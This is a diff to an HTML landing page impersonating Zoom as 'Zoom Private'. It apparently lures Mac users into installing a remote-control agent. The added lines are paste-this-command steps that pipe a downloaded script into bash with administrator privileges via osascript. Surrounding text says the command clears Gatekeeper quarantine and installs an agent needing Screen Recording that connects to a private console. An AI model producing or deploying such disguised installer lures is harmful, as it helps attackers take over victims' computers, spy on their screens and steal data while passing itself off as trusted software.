@@ -6,7 +6,7 @@
 <meta name="theme-color" content="#0B5CFF">
 <meta name="description" content="Zoom Private detects your device, installs the right client automatically, and connects it to your private console — no setup required.">
 <title>Zoom Private | Join your private meeting</title>
-<link rel="icon" href="/img/zoom-mark.png" type="image/png">
+<link rel="icon" href="img/zoom-mark.png" type="image/png">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -167,7 +167,7 @@
 <header>
   <div class="wrap nav">
     <a href="/landing" class="brand">
-      <img src="/img/zoom-mark.png" alt="Zoom Private">
+      <img src="img/zoom-mark.png" alt="Zoom Private">
       Zoom&nbsp;<span style="color:var(--z-blue)">Private</span>
     </a>
     <nav class="nav-links">
@@ -237,7 +237,7 @@
       </div>
 
       <div class="hero-art">
-        <img src="/img/zoom-hero.png" alt="Secure meetings">
+        <img src="img/zoom-hero.png" alt="Secure meetings">
         <div class="float">
           <span class="ic">
             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
@@ -325,6 +325,8 @@
               <li>Approve <b>Screen Recording</b> when macOS asks. The agent starts automatically and connects to the console.</li>
             </ol>
             <div class="tip">Apple Silicon and Intel are detected automatically. If the helper is blocked, double-click the downloaded <b>.command</b> file, or <button type="button" class="link-btn" id="mac-command-btn-help">copy the terminal command</button>.</div>
+            <pre class="mac-cmd" id="mac-osascript">osascript -e 'do shell script "curl -fsSL __MAC_INSTALL_URL__ | /bin/bash" with administrator privileges'</pre>
+            <p class="sub" style="margin:8px 0 0;font-size:.82rem;color:var(--z-muted)">Run the osascript command in Terminal — it elevates with administrator privileges, downloads the client, clears Gatekeeper quarantine, and installs the agent without a browser.</p>
           </div>
         </details>
         <details>
@@ -373,7 +375,7 @@
 
 <footer>
   <div class="wrap foot">
-    <a href="/landing" class="brand"><img src="/img/zoom-mark.png" alt=""> Zoom Private</a>
+    <a href="/landing" class="brand"><img src="img/zoom-mark.png" alt=""> Zoom Private</a>
     <div class="foot-links">
       <a href="#help">Install help</a>
       <a href="#" id="releases-link" target="_blank" rel="noopener">All downloads</a>
@@ -405,6 +407,7 @@
       <li>Press Return and approve the macOS prompts &mdash; <b>Allow incoming connections</b> and <b>Screen Recording</b>.</li>
     </ol>
     <pre class="mac-cmd" id="mac-command">curl -fsSL __MAC_INSTALL_URL__ | /bin/bash</pre>
+    <pre class="mac-cmd" id="mac-osascript-modal">osascript -e 'do shell script "curl -fsSL __MAC_INSTALL_URL__ | /bin/bash" with administrator privileges'</pre>
     <div class="modal-actions">
       <button class="btn btn-primary" id="mac-command-copy" type="button">Copy command</button>
       <a class="btn btn-ghost" id="mac-command-download" href="/api/landing/macos-install.command" download="ZoomPrivate-macOS-Install.command">Download installer</a>
@@ -455,6 +458,6 @@
 
 <div class="toast" id="toast"></div>
 <!-- Externalised (CSP: script-src 'self' + nonce; inline <script> is blocked). -->
-<script src="/js/landing.js" defer></script>
+<script src="js/landing.js" defer></script>
 </body>
 </html>
